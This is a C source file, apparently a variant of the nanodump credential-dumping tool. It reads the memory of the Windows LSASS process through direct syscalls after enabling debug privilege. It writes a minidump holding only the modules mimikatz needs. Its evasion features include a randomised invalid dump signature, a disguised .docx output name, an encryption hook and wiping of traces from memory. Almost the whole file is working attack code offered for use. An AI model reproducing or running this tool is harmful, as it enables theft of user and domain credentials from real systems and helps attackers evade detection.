#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include "CPP_helpers.h"
#define OBJ_CASE_INSENSITIVE                0x00000040L
#define FILE_OVERWRITE_IF               0x00000005
#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020
#include "include/syscalls.h"
#include "include/nanodump.h"
//#include "../ppl_bypass_driver.h"


//HANDLE hProcExpDevice = open_driver();



void writeat(struct dump_context* dc, ULONG32 rva, const void* data, unsigned size)
{
    void* dst = (void*)((ULONG_PTR)dc->BaseAddress + rva);
    besomemcpy_fast(dst, data, size);
}

void append(
    struct dump_context* dc,
    const void* data,
    unsigned size
)
{
    if (dc->rva + size > DUMP_MAX_SIZE)
    {
        printf("Increase MAX_SIZE.\n");

    }
    else
    {
        writeat(dc, dc->rva, data, size);
        dc->rva += size;
    }
}

BOOL write_file(
    char fileName[],
    char fileData[],
    ULONG32 fileLength
)
{
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER largeInteger;
    largeInteger.QuadPart = fileLength;
    wchar_t wcFilePath[MAX_PATH];
    wchar_t wcFileName[MAX_PATH];
    PUNICODE_STRING pUnicodeFilePath = (PUNICODE_STRING)intAlloc(sizeof(UNICODE_STRING));
    if (!pUnicodeFilePath)
    {

        printf("Failed to call Alloc for 0x%x bytes, error: %ld\n", (ULONG32)sizeof(UNICODE_STRING), KERNEL32$GetLastError());
        return FALSE;
    }

    // create a UNICODE_STRING with the file path
    MSVCRT$mbstowcs(wcFileName, fileName, MAX_PATH);
    MSVCRT$wcscpy(wcFilePath, L"\\??\\");
    MSVCRT$wcsncat(wcFilePath, wcFileName, MAX_PATH);
    pUnicodeFilePath->Buffer = wcFilePath;
    pUnicodeFilePath->Length = MSVCRT$wcsnlen(pUnicodeFilePath->Buffer, MAX_PATH);
    pUnicodeFilePath->Length *= 2;
    pUnicodeFilePath->MaximumLength = pUnicodeFilePath->Length + 2;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        pUnicodeFilePath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    // create the file
    NTSTATUS status = _NtCreateFile(
        &hFile,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE,
        &objAttr,
        &IoStatusBlock,
        &largeInteger,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF, //OMRI
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    intFree(pUnicodeFilePath); pUnicodeFilePath = NULL;
    if (status == STATUS_OBJECT_PATH_NOT_FOUND)
    {
        printf("The path '%s' is invalid.\n", fileName);
        return FALSE;
    }
    if (!NT_SUCCESS(status))
    {
        printf("Failed to make file, status: 0x%lx\n", status);
        return FALSE;
    }
    // write the dump
    status = _NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        fileData,
        fileLength,
        NULL,
        NULL
    );
    _NtClose(hFile); hFile = NULL;
    if (!NT_SUCCESS(status))
    {

        return FALSE;
    }

    return TRUE;
}


ULONG32 convert_to_little_endian(
    ULONG32 number
)
{
    return ((number & 0xff000000) >> 3 * 8) | ((number & 0x00ff0000) >> 8) | ((number & 0x0000ff00) << 8) | ((number & 0x000000ff) << 3 * 8);
}

void write_header(
    struct dump_context* dc
)
{
    struct MiniDumpHeader header;
    // the signature might or might not be valid
    header.Signature = convert_to_little_endian(
        *(ULONG32*)(dc->signature)
    );
    header.Version = 42899;
    header.ImplementationVersion = 0;
    header.NumberOfStreams = 3; // we only need: SystemInfoStream, ModuleListStream and Memory64ListStream
    header.StreamDirectoryRva = 32;
    header.CheckSum = 0;
    header.Reserved = 0;
    header.TimeDateStamp = 0;
    header.Flags = 0; // MiniDumpNormal

    char header_bytes[32];
    int offset = 0;
    besomemcpy_fast(header_bytes + offset, &header.Signature, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.Version, 2); offset += 2;
    besomemcpy_fast(header_bytes + offset, &header.ImplementationVersion, 2); offset += 2;
    besomemcpy_fast(header_bytes + offset, &header.NumberOfStreams, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.StreamDirectoryRva, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.CheckSum, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.Reserved, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.TimeDateStamp, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.Flags, 4);
    append(dc, header_bytes, 32);
}

void write_directory(struct dump_context* dc, struct MiniDumpDirectory directory)
{
    byte directory_bytes[12];
    int offset = 0;
    besomemcpy_fast(directory_bytes + offset, &directory.StreamType, 4); offset += 4;
    besomemcpy_fast(directory_bytes + offset, &directory.DataSize, 4); offset += 4;
    besomemcpy_fast(directory_bytes + offset, &directory.Rva, 4);
    append(dc, directory_bytes, sizeof(directory_bytes));
}

void write_directories(
    struct dump_context* dc
)
{
    struct MiniDumpDirectory system_info_directory;
    system_info_directory.StreamType = 7; // SystemInfoStream
    system_info_directory.DataSize = 0; // this is calculated and written later
    system_info_directory.Rva = 0; // this is calculated and written later
    write_directory(dc, system_info_directory);

    struct MiniDumpDirectory module_list_directory;
    module_list_directory.StreamType = 4; // ModuleListStream
    module_list_directory.DataSize = 0; // this is calculated and written later
    module_list_directory.Rva = 0; // this is calculated and written later
    write_directory(dc, module_list_directory);

    struct MiniDumpDirectory memory64_list_directory;
    memory64_list_directory.StreamType = 9; // Memory64ListStream
    memory64_list_directory.DataSize = 0; // this is calculated and written later
    memory64_list_directory.Rva = 0; // this is calculated and written later
    write_directory(dc, memory64_list_directory);
}

BOOL write_system_info_stream(
    struct dump_context* dc
)
{
    struct MiniDumpSystemInfo system_info;

    // read the version and build numbers from the PEB
    void* pPeb;
    ULONG32* OSMajorVersion;
    ULONG32* OSMinorVersion;
    USHORT* OSBuildNumber;
    ULONG32* OSPlatformId;
    UNICODE_STRING* CSDVersion;
    pPeb = (void*)READ_MEMLOC(PEB_OFFSET);

#if _WIN64
    OSMajorVersion = (ULONG32*)(((ULONG64)(pPeb)) + 0x118);
    OSMinorVersion = (ULONG32*)(((ULONG64)(pPeb)) + 0x11c);
    OSBuildNumber = (USHORT*)(((ULONG64)(pPeb)) + 0x120);
    OSPlatformId = (ULONG32*)(((ULONG64)(pPeb)) + 0x124);
    CSDVersion = (UNICODE_STRING*)(((ULONG64)(pPeb)) + 0x2e8);
    system_info.ProcessorArchitecture = 9; // AMD64
#else
    OSMajorVersion = (ULONG32*)(((ULONG32)(pPeb)) + 0xa4);
    OSMinorVersion = (ULONG32*)(((ULONG32)(pPeb)) + 0xa8);
    OSBuildNumber = (USHORT*)(((ULONG32)(pPeb)) + 0xac);
    OSPlatformId = (ULONG32*)(((ULONG32)(pPeb)) + 0xb0);
    CSDVersion = (UNICODE_STRING*)(((ULONG32)(pPeb)) + 0x1f0);
    system_info.ProcessorArchitecture = 0; // INTEL
#endif

    system_info.ProcessorLevel = 0;
    system_info.ProcessorRevision = 0;
    system_info.NumberOfProcessors = 0;
    // NTDLL$RtlGetVersion -> wProductType
    system_info.ProductType = VER_NT_WORKSTATION;
    //system_info.ProductType = VER_NT_DOMAIN_CONTROLLER;
    //system_info.ProductType = VER_NT_SERVER;
    system_info.MajorVersion = *OSMajorVersion;
    system_info.MinorVersion = *OSMinorVersion;
    system_info.BuildNumber = *OSBuildNumber;
    system_info.PlatformId = *OSPlatformId;
    system_info.CSDVersionRva = 0; // this is calculated and written later
    system_info.SuiteMask = 0;
    system_info.Reserved2 = 0;
#if _WIN64
    system_info.ProcessorFeatures1 = 0;
    system_info.ProcessorFeatures2 = 0;
#else
    system_info.VendorId1 = 0;
    system_info.VendorId2 = 0;
    system_info.VendorId3 = 0;
    system_info.VersionInformation = 0;
    system_info.FeatureInformation = 0;
    system_info.AMDExtendedCpuFeatures = 0;
#endif

#if _WIN64
    ULONG32 stream_size = 48;
    char system_info_bytes[48];
#else
    ULONG32 stream_size = 56;
    char system_info_bytes[56];
#endif

    int offset = 0;
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProcessorArchitecture, 2); offset += 2;
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProcessorLevel, 2); offset += 2;
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProcessorRevision, 2); offset += 2;
    besomemcpy_fast(system_info_bytes + offset, &system_info.NumberOfProcessors, 1); offset += 1;
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProductType, 1); offset += 1;
    besomemcpy_fast(system_info_bytes + offset, &system_info.MajorVersion, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.MinorVersion, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.BuildNumber, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.PlatformId, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.CSDVersionRva, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.SuiteMask, 2); offset += 2;
    besomemcpy_fast(system_info_bytes + offset, &system_info.Reserved2, 2); offset += 2;
#if _WIN64
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProcessorFeatures1, 8); offset += 8;
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProcessorFeatures2, 8); offset += 8;
#else
    besomemcpy_fast(system_info_bytes + offset, &system_info.VendorId1, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.VendorId2, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.VendorId3, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.VersionInformation, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.FeatureInformation, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.AMDExtendedCpuFeatures, 4); offset += 4;
#endif

    ULONG32 stream_rva = dc->rva;
    append(dc, system_info_bytes, stream_size);

    // write our length in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 4, &stream_size, 4); // header + streamType

    // write our RVA in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 4 + 4, &stream_rva, 4); // header + streamType + Location.DataSize

    // write the service pack
    ULONG32 sp_rva = dc->rva;
    ULONG32 Length = CSDVersion->Length;
    // write the length
    append(dc, &Length, 4);
    // write the service pack name
    append(dc, CSDVersion->Buffer, CSDVersion->Length);
    // write the service pack RVA in the SystemInfoStream
    writeat(dc, stream_rva + 24, &sp_rva, 4); // addrof CSDVersionRva

    return TRUE;
}
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;


PVOID get_peb_address(
    HANDLE hProcess
)
{
    PROCESS_BASIC_INFORMATION basic_info;
    PROCESSINFOCLASS ProcessInformationClass = 0;
    NTSTATUS status = _NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    );
    if (!NT_SUCCESS(status))
    {

        return 0;
    }

    return basic_info.PebBaseAddress;
}

struct module_info* find_modules(
    HANDLE hProcess,
    wchar_t* important_modules[],
    int number_of_important_modules,
    BOOL is_lsass
)
{
    // module list
    struct module_info* module_list = NULL;
    BOOL lsasrv_found = FALSE;
    SHORT pointer_size;
    PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, ldr_entry_address, first_ldr_entry_address;

    peb_address = get_peb_address(hProcess);
    if (!peb_address)
        return NULL;

#if _WIN64
    pointer_size = 8;
    ldr_pointer = (char*)peb_address + 0x18;
#else
    pointer_size = 4;
    ldr_pointer = peb_address + 0xc;
#endif

    NTSTATUS status = _NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_pointer,
        &ldr_address,
        pointer_size,
        NULL
    );
    if (status == STATUS_PARTIAL_COPY && !is_lsass)
    {
        // failed to read the memory of some process, simply continue
        return NULL;
    }
    if (!NT_SUCCESS(status))
    {

        return NULL;
    }

#if _WIN64
    module_list_pointer = (char*)ldr_address + 0x20;
#else
    module_list_pointer = ldr_address + 0x14;
#endif

    status = _NtReadVirtualMemory(
        hProcess,
        (PVOID)module_list_pointer,
        &ldr_entry_address,
        pointer_size,
        NULL
    );
    if (!NT_SUCCESS(status))
    {
        return NULL;
    }

    first_ldr_entry_address = ldr_entry_address;
    SHORT dlls_found = 0;
    struct LDR_DATA_TABLE_ENTRY ldr_entry;

    while (dlls_found < number_of_important_modules)
    {
        // read the entry
        status = _NtReadVirtualMemory(
            hProcess,
            ldr_entry_address,
            &ldr_entry,
            sizeof(struct LDR_DATA_TABLE_ENTRY),
            NULL
        );
        if (!NT_SUCCESS(status))
        {

            return NULL;
        }

        BOOL has_read_name = FALSE;
        wchar_t base_dll_name[256];
        // check if this dll is one of the dlls we are looking for
        for (int i = 0; i < number_of_important_modules; i++)
        {
            SHORT length = MSVCRT$wcsnlen(important_modules[i], 0xFF);

            // if the length of the name doesn't match, continue
            if (length * 2 != ldr_entry.BaseDllName.Length)
                continue;

            if (!has_read_name)
            {
                // initialize base_dll_name with all null-bytes
                //memset(base_dll_name, 0, sizeof(base_dll_name));
                besomemset_stosb(base_dll_name, 0, sizeof(base_dll_name));
                // read the dll name
                status = _NtReadVirtualMemory(
                    hProcess,
                    (PVOID)ldr_entry.BaseDllName.Buffer,
                    base_dll_name,
                    ldr_entry.BaseDllName.Length,
                    NULL
                );
                if (!NT_SUCCESS(status))
                {

                    return NULL;
                }
                has_read_name = TRUE;
            }

            // compare the DLL's name, case insensitive
            if (!MSVCRT$_wcsicmp(important_modules[i], base_dll_name))
            {
                // check if the DLL is 'lsasrv.dll' so that we know the process is LSASS

                lsasrv_found = TRUE;

                struct module_info* new_module = (struct module_info*)intAlloc(sizeof(struct module_info));
                if (!new_module)
                {

                    return NULL;
                }
                new_module->next = NULL;
                new_module->dll_base = (PVOID)ldr_entry.DllBase;
                new_module->size_of_image = ldr_entry.SizeOfImage;

                // read the full path of the DLL
                status = _NtReadVirtualMemory(
                    hProcess,
                    (PVOID)ldr_entry.FullDllName.Buffer,
                    new_module->dll_name,
                    ldr_entry.FullDllName.Length,
                    NULL
                );
                if (!NT_SUCCESS(status))
                {

                    return NULL;
                }
                if (!module_list)
                {
                    module_list = new_module;
                }
                else
                {
                    struct module_info* last_module = module_list;
                    while (last_module->next)
                        last_module = last_module->next;
                    last_module->next = new_module;
                }
                dlls_found++;
            }
        }

        // next entry
        ldr_entry_address = ldr_entry.InMemoryOrderLinks.Flink;
        // if we are back at the beginning, return
        if (ldr_entry_address == first_ldr_entry_address)
            break;
    }
    if (is_lsass && !lsasrv_found)
    {

        return NULL;
    }
    return module_list;
}

struct module_info* write_module_list_stream(
    struct dump_context* dc
)
{
    // list of modules relevant to mimikatz
    wchar_t* important_modules[] = {
        L"lsasrv.dll", L"msv1_0.dll", L"tspkg.dll", L"wdigest.dll", L"kerberos.dll",
        L"livessp.dll", L"dpapisrv.dll", L"kdcsvc.dll", L"cryptdll.dll", L"lsadb.dll",
        L"samsrv.dll", L"rsaenh.dll", L"ncrypt.dll", L"ncryptprov.dll", L"eventlog.dll",
        L"wevtsvc.dll", L"termsrv.dll", L"cloudap.dll"
    };
    struct module_info* module_list = find_modules(
        dc->hProcess,
        important_modules,
        ARRAY_SIZE(important_modules),
        TRUE
    );
    if (module_list == NULL)
        return NULL;

    // write the full path of each dll
    struct module_info* curr_module = module_list;
    ULONG32 number_of_modules = 0;
    while (curr_module)
    {
        number_of_modules++;
        curr_module->name_rva = dc->rva;
        ULONG32 full_name_length = MSVCRT$wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
        full_name_length++; // account for the null byte at the end
        full_name_length *= 2;
        // write the length of the name
        append(dc, &full_name_length, 4);
        // write the path
        append(dc, curr_module->dll_name, full_name_length);
        curr_module = curr_module->next;
    }

    ULONG32 stream_rva = dc->rva;
    // write the number of modules
    append(dc, &number_of_modules, 4);
    byte module_bytes[108];
    curr_module = module_list;
    while (curr_module)
    {
        struct MiniDumpModule module;
        module.BaseOfImage = (ULONG_PTR)curr_module->dll_base;
        module.SizeOfImage = curr_module->size_of_image;
        module.CheckSum = 0;
        module.TimeDateStamp = 0;
        module.ModuleNameRva = curr_module->name_rva;
        module.VersionInfo.dwSignature = 0;
        module.VersionInfo.dwStrucVersion = 0;
        module.VersionInfo.dwFileVersionMS = 0;
        module.VersionInfo.dwFileVersionLS = 0;
        module.VersionInfo.dwProductVersionMS = 0;
        module.VersionInfo.dwProductVersionLS = 0;
        module.VersionInfo.dwFileFlagsMask = 0;
        module.VersionInfo.dwFileFlags = 0;
        module.VersionInfo.dwFileOS = 0;
        module.VersionInfo.dwFileType = 0;
        module.VersionInfo.dwFileSubtype = 0;
        module.VersionInfo.dwFileDateMS = 0;
        module.VersionInfo.dwFileDateLS = 0;
        module.CvRecord.DataSize = 0;
        module.CvRecord.rva = 0;
        module.MiscRecord.DataSize = 0;
        module.MiscRecord.rva = 0;
        module.Reserved0 = 0;
        module.Reserved0 = 0;

        int offset = 0;
        besomemcpy_fast(module_bytes + offset, &module.BaseOfImage, 8); offset += 8;
        besomemcpy_fast(module_bytes + offset, &module.SizeOfImage, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.CheckSum, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.TimeDateStamp, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.ModuleNameRva, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwSignature, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwStrucVersion, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileVersionMS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileVersionLS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwProductVersionMS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwProductVersionLS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileFlagsMask, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileFlags, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileOS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileType, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileSubtype, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileDateMS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.VersionInfo.dwFileDateLS, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.CvRecord.DataSize, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.CvRecord.rva, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.MiscRecord.DataSize, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.MiscRecord.rva, 4); offset += 4;
        besomemcpy_fast(module_bytes + offset, &module.Reserved0, 8); offset += 8;
        besomemcpy_fast(module_bytes + offset, &module.Reserved1, 8);

        append(dc, module_bytes, sizeof(module_bytes));
        curr_module = curr_module->next;
    }

    // write our length in the MiniDumpSystemInfo directory
    ULONG32 stream_size = 4 + number_of_modules * sizeof(module_bytes);
    writeat(dc, 32 + 12 + 4, &stream_size, 4); // header + 1 directory + streamType

    // write our RVA in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 12 + 4 + 4, &stream_rva, 4); // header + 1 directory + streamType + Location.DataSize

    return module_list;
}

void free_linked_list(
    void* head
)
{
    if (head == NULL)
        return;

    ULONG32 number_of_nodes = 1;
    struct linked_list* node = (struct linked_list*)head;
    while (node->next)
    {
        number_of_nodes++;
        node = node->next;
    }

    for (int i = number_of_nodes - 1; i >= 0; i--)
    {
        struct linked_list* node = (struct linked_list*)head;

        int jumps = i;
        while (jumps--)
            node = node->next;

        intFree(node); node = NULL;
    }
}

BOOL is_important_module(
    PVOID address,
    struct module_info* module_list
)
{
    struct module_info* curr_module = module_list;
    while (curr_module)
    {
        if ((ULONG_PTR)address >= (ULONG_PTR)curr_module->dll_base &&
            (ULONG_PTR)address < (ULONG_PTR)curr_module->dll_base + curr_module->size_of_image)
            return TRUE;
        curr_module = curr_module->next;
    }
    return FALSE;
}

struct MiniDumpMemoryDescriptor64* get_memory_ranges(
    struct dump_context* dc,
    struct module_info* module_list
)
{
    struct MiniDumpMemoryDescriptor64* ranges_list = NULL;
    PVOID base_address, current_address;
    ULONG64 region_size;
    current_address = 0;
    MEMORY_INFORMATION_CLASS mic = 0;
    MEMORY_BASIC_INFORMATION mbi;

    while (TRUE)
    {
        NTSTATUS status = _NtQueryVirtualMemory(
            dc->hProcess,
            (PVOID)current_address,
            mic,
            &mbi,
            sizeof(mbi),
            NULL
        );
        if (!NT_SUCCESS(status))
            break;

        base_address = mbi.BaseAddress;
        region_size = mbi.RegionSize;
        // next memory range
        current_address = (char*)base_address + region_size;

        // ignore non-commited pages
        if (mbi.State != MEM_COMMIT)
            continue;
        // ignore pages with PAGE_NOACCESS
        if ((mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS)
            continue;
        // ignore mapped pages
        if (mbi.Type == MEM_MAPPED)
            continue;
        // ignore pages with PAGE_GUARD as they can't be read
        if ((mbi.Protect & PAGE_GUARD) == PAGE_GUARD)
            continue;
        // ignore modules that are not relevant to mimikatz
        if (mbi.Type == MEM_IMAGE &&
            !is_important_module(
                base_address,
                module_list))
            continue;

        struct MiniDumpMemoryDescriptor64* new_range = (struct MiniDumpMemoryDescriptor64*)intAlloc(sizeof(struct MiniDumpMemoryDescriptor64));
        if (!new_range)
        {

            return NULL;
        }
        new_range->next = NULL;
        new_range->StartOfMemoryRange = (ULONG_PTR)base_address;
        new_range->DataSize = region_size;

        if (!ranges_list)
        {
            ranges_list = new_range;
        }
        else
        {
            struct MiniDumpMemoryDescriptor64* last_range = ranges_list;
            while (last_range->next)
                last_range = last_range->next;
            last_range->next = new_range;
        }
    }
    return ranges_list;
}

struct MiniDumpMemoryDescriptor64* write_memory64_list_stream(
    struct dump_context* dc,
    struct module_info* module_list
)
{
    ULONG32 stream_rva = dc->rva;

    struct MiniDumpMemoryDescriptor64* memory_ranges = get_memory_ranges(
        dc,
        module_list
    );
    if (!memory_ranges)
        return FALSE;

    // write the number of ranges
    ULONG64 number_of_ranges = 1;
    struct MiniDumpMemoryDescriptor64* curr_range = memory_ranges;
    while (curr_range->next && number_of_ranges++)
        curr_range = curr_range->next;
    append(dc, &number_of_ranges, 8);

    // write the rva of the actual memory content
    ULONG32 stream_size = 16 + 16 * number_of_ranges;
    ULONG64 base_rva = stream_rva + stream_size;
    append(dc, &base_rva, 8);

    // write the start and size of each memory range
    curr_range = memory_ranges;
    while (curr_range)
    {
        append(dc, &curr_range->StartOfMemoryRange, 8);
        append(dc, &curr_range->DataSize, 8);
        curr_range = curr_range->next;
    }

    // write our length in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 12 * 2 + 4, &stream_size, 4); // header + 2 directories + streamType

    // write our RVA in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 12 * 2 + 4 + 4, &stream_rva, 4); // header + 2 directories + streamType + Location.DataSize

    // dump all the selected memory ranges
    curr_range = memory_ranges;
    while (curr_range)
    {
        byte* buffer = (byte*)intAlloc(curr_range->DataSize);
        if (!buffer)
        {

            return NULL;
        }
        NTSTATUS status = _NtReadVirtualMemory(
            dc->hProcess,
            (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
            buffer,
            curr_range->DataSize,
            NULL
        );
        if (!NT_SUCCESS(status))
        {
            printf("Failed to call NtRead, status: 0x%lx\n", status);
            //return NULL;
        }

        append(dc, buffer, curr_range->DataSize);
        intFree(buffer); buffer = NULL;
        curr_range = curr_range->next;
    }

    return memory_ranges;
}

BOOL NanoDumpWriteDump(
    struct dump_context* dc
)
{
    write_header(dc);

    write_directories(dc);

    if (!write_system_info_stream(dc))
        return FALSE;

    struct module_info* module_list;
    module_list = write_module_list_stream(dc);
    if (!module_list)
        return FALSE;

    struct MiniDumpMemoryDescriptor64* memory_ranges;
    memory_ranges = write_memory64_list_stream(dc, module_list);
    if (!memory_ranges)
        return FALSE;

    free_linked_list(module_list); module_list = NULL;

    free_linked_list(memory_ranges); memory_ranges = NULL;

    return TRUE;
}

void encrypt_dump(
    void* BaseAddress,
    ULONG32 Size
)
{
    // add your code here
    return;
}

void usage(char* procname)
{
    printf("usage: %s --write C:\\Windows\\Temp\\omri.docx [--valid] [--pid 1234] [-m 1/2/3] [--help]\n", procname);
}

void get_invalid_sig(char* signature)
{
    time_t t;
    srand((unsigned)time(&t));
    signature[0] = 'P';
    signature[1] = 'M';
    signature[2] = 'D';
    signature[3] = 'M';

    while (!strncmp(signature, "PMDM", 4))
    {
        signature[0] = rand() & 0xFF;
        signature[1] = rand() & 0xFF;
        signature[2] = rand() & 0xFF;
        signature[3] = rand() & 0xFF;
    }
}



int main(int argc, char* argv[])
{

    RevertToSelf();
    DWORD MethodType = 2;
    int pid = 0;
    char* dump_name = NULL;
    char signature[4];
    BOOL success;

    // generate a random signature
    get_invalid_sig(signature);

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "-v", 3) || !strncmp(argv[i], "--valid", 8))
        {
            signature[0] = 'P';
            signature[1] = 'M';
            signature[2] = 'D';
            signature[3] = 'M';
        }

        if (!strncmp(argv[i], "-w", 3) || !strncmp(argv[i], "--write", 8))
        {
            dump_name = argv[++i];
        }
        else if (!strncmp(argv[i], "-p", 3))
        {
            pid = atoi(argv[++i]);
        }

        else if (!strncmp(argv[i], "-m", 3))
        {
            MethodType = atoi(argv[++i]);
        }
        else if (!strncmp(argv[i], "-h", 3) || !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }

    }



    if (!dump_name)
    {
        usage(argv[0]);
        return -1;
    }

    if (!strrchr(dump_name, '\\'))
    {
        return -1;
    }

    success = SetDebugPrivilege();
    if (success)
    {
        printf("%s", "got priv!\n");
    }


    HANDLE hProcess = 0;
    if (pid)
        hProcess = GetLsassHandle(pid, MethodType);

    if (!hProcess)
        return -1;

    // allocate a chuck of memory to write the dump
    void* BaseAddress = NULL;
    SIZE_T RegionSize = DUMP_MAX_SIZE;
    NTSTATUS status = _NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &RegionSize, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        _NtClose(hProcess); hProcess = NULL;
        return -1;
    }

    struct dump_context dc;
    dc.hProcess = hProcess;
    dc.BaseAddress = BaseAddress;
    dc.rva = 0;
    dc.signature = signature;

    success = NanoDumpWriteDump(&dc);

    // at this point, you can encrypt or obfuscate the dump
    encrypt_dump(dc.BaseAddress, dc.rva);

    if (success)
    {
        success = write_file(
            dump_name,
            dc.BaseAddress,
            dc.rva
        );
    }

    // delete all trace of the dump from memory

    besomemset_stosb(BaseAddress, 0, dc.rva);
    // free the memory area where the dump was
    status = _NtFreeVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        &RegionSize,
        MEM_RELEASE
    );
    if (!NT_SUCCESS(status))
    {
        printf("Failed to call Free, status: 0x%lx\n", status);
    }

    // close the handle
    _NtClose(hProcess); hProcess = NULL;

    if (success)
    {
        printf("Done!");
    }
    return 0;
}

